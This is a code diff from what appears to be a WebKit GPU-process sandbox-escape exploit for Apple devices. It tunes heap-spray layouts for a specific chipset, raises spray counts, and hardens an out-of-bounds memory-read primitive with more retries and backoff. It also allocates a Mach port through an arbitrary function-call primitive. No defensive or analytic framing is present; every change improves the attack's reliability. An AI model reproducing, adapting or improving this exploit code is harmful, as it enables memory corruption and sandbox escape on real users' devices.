@@ -7106,31 +7106,29 @@
       ]
     }
   };
+  const spray_profiles_a17pro = {
+    name: "a17pro",
+    pixelUnpackFill: 0x8015c8,
+    midSprays: [
+      [5, 0x100],
+      [0x1d - 1, 0x1000],
+      [2, 0x800]
+    ],
+    tailSprays: [
+      [2, 0x100],
+      [1, 0x400]
+    ]
+  };
   const chipset_spray_profile = {
     "f35b705e8c57ae59e369ebc9145a9dbc": spray_profiles.compact_alt_fill,
     "43ba9900ff2fc7d9d32072540b2cab12": spray_profiles.wide,
     "c90776dbac058ed6957f476e287867f8": spray_profiles.wide,
-    "22f32fd975a694d340a6ad22b872b1ae": spray_profiles.wide
+    "22f32fd975a694d340a6ad22b872b1ae": spray_profiles.wide,
+    "c33e4990a9d3afe948b98d7d4205d596": spray_profiles_a17pro
   };
   const chipset_fallback_profile_sequences = {
-    // Recent repro logs for this A17/A17 Pro family hash only produced real
-    // SBX0 landings on the compact layout. compact_alt_fill tends to finish
-    // the CA OOB but collapse in iterativeRead(), while the wider layouts
-    // destabilize much earlier. Pin fresh runs to compact and only use
-    // retry-budget tuning to decide whether we reattempt inside the same
-    // WebContent lifetime.
-    "c33e4990a9d3afe948b98d7d4205d596": [
-      spray_profiles.compact
-    ]
   };
   const chipset_inprocess_attempt_budget = {
-    // Allow one extra fresh-GPU retry when AGX dies early, but bail
-    // immediately once we've dirtied the CA leak path in this process.
-    "c33e4990a9d3afe948b98d7d4205d596": {
-      default: 1,
-      "agx oob failed": 2,
-      "coreanimation oob failed": 1
-    }
   };
   const fallback_spray_profiles = [
     spray_profiles.compact,
@@ -7333,7 +7331,7 @@
       sprayBuffers(50, 0x4000);
       sprayBuffers(10, 0x20000);
       sprayBuffers(10, 0x4000 * 20);
-      for (let i = 0; i < 30; i++) {
+      for (let i = 0; i < 50; i++) {
         RemoteRenderingBackend_CreateImageBuffer(backendConnection, 0x20, 0x80);
       }
     }
@@ -7409,6 +7407,8 @@
       RemoteGraphicsContextGL_Finish();
       RemoteGraphicsContextGL_PixelStorei(GL_UNPACK_IMAGE_HEIGHT, 0);
       RemoteGraphicsContextGL_BindBuffer(GL_PIXEL_UNPACK_BUFFER, 0);
+      RemoteGraphicsContextGL_Flush();
+      RemoteGraphicsContextGL_Finish();
       texImage2D1(GL_DEPTH_COMPONENT32F, GL_DEPTH_COMPONENT, GL_FLOAT, width, height);
       if (!texImage2D1(GL_DEPTH_COMPONENT32F, GL_DEPTH_COMPONENT, GL_FLOAT, 0x20, 0x20, timeout = crash_timeout)) {
         return false;
@@ -7425,6 +7425,8 @@
       for (let i = 0; i < 9; i++) {
         if (!RemoteDisplayListRecorder_StrokeRect(imageBufferIdentifiers[dirtyWriteIndex], 0, 0, 0, 0x100 + i, 0x100 + i, timeout = crash_timeout)) return false;
       }
+      RemoteGraphicsContextGL_Flush();
+      RemoteGraphicsContextGL_Finish();
       const draw_glyphs_length = 0x6a8;
       const glyphs = new BigUint64Array(draw_glyphs_length / 0x8 * 0x2);
       glyphs[glyphs.length - 4] = 0n;
@@ -7516,15 +7518,25 @@
       if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 3], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
       return true;
     }
+    const _yieldPortBuf = new BigUint64Array(1);
+    fcall(offsets.mach_port_allocate, __mach_task_self, 1n, _yieldPortBuf.data());
+    const _yieldPort = _yieldPortBuf[0];
+    function yieldWait(ms) {
+      fcall(offsets.mach_msg_fn, receiveBufferDataPointer,
+            0x102n, 0n, receiveBufferSizeAsBigInt,
+            _yieldPort, BigInt(ms), 0n);
+    }
     function iterativeRead(address, size) {
-      const max_attempts = 4;
+      const max_attempts = 8;
       let last_leak_size = 0;
+      let backoff = 5;
       for (let attempt = 0; attempt < max_attempts; attempt++) {
         if (dirty_read_count++ != 0) {
           if (!RemoteDisplayListRecorder_DrawGlyphs(imageBufferIdentifiers[dirtyWriteIndex + 1], cache_id, new Uint8Array(0x10), new Uint8Array(0x80), 8, timeout = crash_timeout)) return false;
         }
         RemoteDisplayListRecorder_SetCTM(imageBufferIdentifiers[dirtyWriteIndex + 2], size << 32n | 3n, address, 0x0000000049ac480cn, 0n, 0n, 0n);
         if (!RemoteDisplayListRecorder_FillRect(imageBufferIdentifiers[dirtyWriteIndex + 2], 0, 0, 0, 0, true, timeout = crash_timeout)) return false;
+        RemoteImageBuffer_PutPixelBuffer(imageBufferIdentifiers[dirtyWriteIndex + 2], 0x20, 0x80);
         RemoteGraphicsContextGL_Flush();
         RemoteGraphicsContextGL_Finish();
         const leak = RemoteGraphicsContextGL_GetShaderSource();
@@ -7533,7 +7545,8 @@
         }
         last_leak_size = leak.byteLength;
         LOG(`iterativeRead retry ${attempt + 1}/${max_attempts}: expected ${size}, actual ${leak.byteLength}`);
-        sleep(5);
+        yieldWait(backoff);
+        backoff = Math.min(backoff * 2, 640);
       }
       crashGPUProcess(`leak size mismatch (expected: ${size}, actual: ${last_leak_size})`);
       return false;
